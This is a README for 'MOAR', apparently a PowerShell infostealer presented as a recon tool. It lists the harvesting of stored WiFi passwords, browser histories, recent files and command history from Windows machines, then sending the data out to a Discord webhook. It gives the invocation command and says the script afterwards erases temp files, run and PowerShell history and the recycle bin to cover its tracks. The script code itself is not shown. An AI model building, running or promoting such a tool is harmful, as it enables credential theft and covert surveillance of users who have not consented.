# MOAR - Mother Of All Recons

MOAR is a PowerShell script built to gather an extensive amount of information about a Windows system. This includes but is not limited to, system configurations, network details, browsing history, recently accessed files, and much more.

## Features

- **Geolocation**: Fetches geolocation data based on the current IP.
- **Network Configuration**: Gathers details like IP, Default Gateway, DNS, and others.
- **Recent Files**: Retrieves the 50 most recently accessed files.
- **System Users**: Lists all the user accounts on the system.
- **Firewall and Antivirus Details**: Checks the status of the firewall and antivirus product details.
- **Wifi SSIDs and Passwords**: Gathers stored WiFi SSIDs and their corresponding passwords.
- **Computer Info**: Grabs a detailed list of computer specifications.
- **Process and App Details**: Lists all currently running processes and installed apps.
- **Browser Data**: Captures browser histories and bookmarks from popular browsers like Edge, Chrome, and Firefox.
- **Additional Data**: Retrieves additional details such as a tree structure of the user profile directory and PowerShell command history.
- **Upload to Discord**: Has the ability to upload all the gathered data to Discord via a webhook.

## Usage

To use the script, you must provide your Discord Webhook URL as a parameter to the main function `AR`. This will allow the script to send all the gathered data to the specified Discord channel.

```powershell
AR -wh 'YOUR_DISCORD_WEBHOOK_URL'
```

For example:

```powershell
AR -wh 'https://discord.com/api/webhooks/xxxx/yyyy'
```

## Precautions

- **Sensitive Data**: This script retrieves a large amount of sensitive data. Be sure to handle the output responsibly and securely.
- **Intended Use**: Only run this script on systems you have permission to. Unauthorized scanning and data collection is illegal and unethical.
- **Cleanup**: The script performs a cleanup at the end, including emptying the temp folder, deleting run box history, PowerShell history, and emptying the recycle bin.

